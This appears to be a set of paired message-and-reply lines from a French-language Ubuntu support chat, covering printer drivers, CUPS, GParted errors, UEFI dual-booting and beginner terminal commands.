mais quest que le pilote propriétaire peut m'apporter de plus	Tu l'as testê avec les vidéos ?
le libre fonctionne	bah si le libre fontionne et que tu n'as pas besoin de plus, à quoi bon se compliquer la vie ?
Ah ok, je suis sur mon portable et je ne suis pas français non plus, je ne le savais pas. Merci ^^	de nada :)
lol	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
Salut	il y a un paste pour Ubuntu-fr.
un petit rappel svp	creer un fichier vide ? touch
Ca vient de me revenir dsl	Tape "df -hT" sur ton système s'il te plaît. Montre-moi les résultats sur pastebin.com
C'est vraiment que je n'ai pas acces à changer les persmissions des fichiers dans mon Vantec.	Quel système de fichier sur le disque externe ?
bonjour, j'ai installé Kubuntu 14.04 sur mon pc et comme il me reste de la place sur le HDD, je voulais ajouter une partition hors le logiciel de KDE ne me permet pas de modifier et gparted me renvois cette erreur :gpartedbin:20801): Gtk-WARNING **: cannot open display:, que puis-je faire	http://www.linuxquestions.org/questions/debian-26/gtk-warning-**-cannot-open-display-0-0-a-807450/ .
ou plus simple, si vous connaissez un programme open source (assez gros) fait avec avec ces technos, ca me permettrai de regarder comment ils ont fait	y en a vraiment plein, je serais surpris qu'une recherche simple n'en resorte pas une dizaine. ca fait tres longtemps que je n'ai pas touché à gtk, mais pendant longtemps, glade etait la reference pour designer une UI en gtk, ce qui t'imposait ton framework-like, enfin pour des questions concernant des langages specifiques, autant s'adresser aux salons dédiés, en l'occurence #python et #
sinon, j'ai un soucis de wifi mais je verrai ca demain	 le truc con , il est bien activé le wifi sur ta box ?
c'est quoi comme imprimante ?	laisse tomber l'ami, c'est sympa de vouloir m'aider... la j'abandonne avant de peter un cable, je verais ca demain ;)
oui je suis sur l'interface CUPS, c'est las que je vois que les impressions sont en taches terminées	 l'imprimante imprime mal avec quel logiciel ?
le truc qui ne sert pas à grand chose en fait	dans unity ? dsl, j'peux pas t'aider, j'suis sur gnome
dans unity ? dsl, j'peux pas t'aider, j'suis sur gnome	 c'était quo iton probleme d'imprimante ?
et t'es sur que c'est pas l'imprimante qui ne fonctionne plus ? (on ne sait jamais)	j'installe le driver propriétaire, j'te tiens au jus
bon personne n'a un dash qui occupe tout l'écran alors ?	c'est quoi dash ?
alors qu'avant mtink gérait tout	moi c'est juste depuis mise à jour système (je le fais régulièrement, au moins 1x/mois) donc c'est pas a cause d'une imprimante "exotique", mal supporté sous linux
moi c'est juste depuis mise à jour système (je le fais régulièrement, au moins 1x/mois) donc c'est pas a cause d'une imprimante "exotique", mal supporté sous linux	 la mienne pas exotique , je l'ai depuis 9 ans , toujours parfaitement reconnue, une epson , sauf depuis quelques versions d'ubuntu
bah la en bidouillant, j'ai réussi a faire imprimer la page de test une fois....	 moi au niveau imprimante ça fait un moment que je galère
vous avez votr edash en plein écran sur ubuntu 14.10 ?	tu aurais pas une résolution toute petite ?
tu aurais pas une résolution toute petite ?	 écran 24 pouces et résolution normale genre 1920*1080 ou un truc dans le genre (je ne me souviens plus des valeurs exactes)
Je fais "imprimer la page de test" et la tache passe directement en tache terminée dans l'interface CUPS	tu as installé les drivers d'HP ?
quelqu'un a deja utilisé le logiciel de reconnaissance vocale sous ubuntu 14.04	tu ne veux vraiment pas essayer youtube-dl ?
télécharger les vidéos de youtube, c'est pas contre leurs conditions d'utilisation ?	il existe d'autres outils
jdownloader	mais pourquoi utiliser jdownloader ? qu'a-t-il de plus que curl ou wget ?
pourquoi utiliser du Java ?	il y a de bonnes applications en Java (comme Sweet Home 3D) mais elles sont rares
l'application marche avec du java	quelle application ?
salut julien456 j'avais essayé pour tenter de résoudre un problème d'affichage, mais sans succès	j'ai testé pour résoudre un problème de shared folders mais ca n'a pas l'air de fonctionner du tout, merci pour ta réponse ;)
sos	c'est un peu vague comme description
Bonne journeé à tous bye	Salut.
C'est pas simple quand on connait trés peut les bases avec sont terminal  jves bosser la  dessus	http://framabook.org/unix-pour-aller-plus-loin-avec-la-ligne-de-commande/ j'ai mis plusieurs fois à le lire pour commencer à le maîtriser, et là, il faudrait que je m'y remette.
c'est cool	De rien. :-)
Bon aussi non c'est pas grave je vais passer à autre chose mais j'aime pas rester sur un echec :)	Repose ta question plus tard, quelqu'un pourra peut être aider.
redirigé le dossier bespoke dans un dossier creé au prealable sur mon Bureau	Oui, un truc dans le genre, oui chercher le dossier bespoke dans l'arborescence.
Oué je sais  mais la j'ai pas un problème d'installation toute et expliqué . Mon problème se trouve que dans la vidéo de grafikart sur bespoke il un moment ou il veut metre tous cela dans un dossier vierge . Et à se moment la il tappe une commande pour que bespoke se trouve dans se fameux dossier .C'est cela que je n'arrive pas à faire avec ubuntu clache	En tous cas, je t'aurais bien demandé le lien de ton tutoriel, mais la carte son de mon ordinateur ne  marche plus. Je ne pourrais le suivre. :-/
Pour au moins connaitre les commandes ou un tutoriel de précision pour un noobs comme moi mdrr :)	Tu peux peut être le mettre dans un dossier vide de tob utilisateur, non?
Es que quelqun ici aurais le même genre de tutoriel mais sur ubuntu 14.04 ?	Il suffit peut être d'adapter le tutoriel windows, s'en inspirer.
Bonne journée	De rien, et aide-toi de http://doc.ubuntu-fr.org/ .:-)
Uefi?  je ne connais pas	Note qu'il est possible d'utiliser ubuntu sur des machines de moins d'1Gio de ram, mais j'ai éludé la question sur ce point car ça n'avait pas d’intérêt dans ton cas me semble t'il.
je pense faire des tests avec un poste de travail donc installer Ubuntu et ensuite tester mes soft. est ce que Ubuntu s'installe sur n'importe quel pc ou avons des restrictions matérielles?	C'est le remplaçant du bios. http://doc.ubuntu-fr.org/uefi ou https://fr.wikipedia.org/wiki/UEFI .
note on une perte de performance du soft sous une machine virtuelle?	Les gens qui ratent leur dual-boot sont ceux qui n'ont pas respecté à la lettre la procédure, et celle-ci est pointilleuse à cause de l'uefi. Avant, nous avions moins de soucis avec les approximations car on les rattrapait facilement.
J'ai compris en faite qu'il était possible de faire une émulation de Windows pour lancer des soft non compatible. y a t il un intérêt du coup à passer sous Ubuntu dans ce cas?	Si il y a 1Gio de ram, ubuntu ne se plaint pas. Les seules choses parfois pas faciles à bien faire, c'est un dual-boot quand on a un uefi.
Comment va tu?	Je vais très bien :)
Bonjour	Bonjour :D
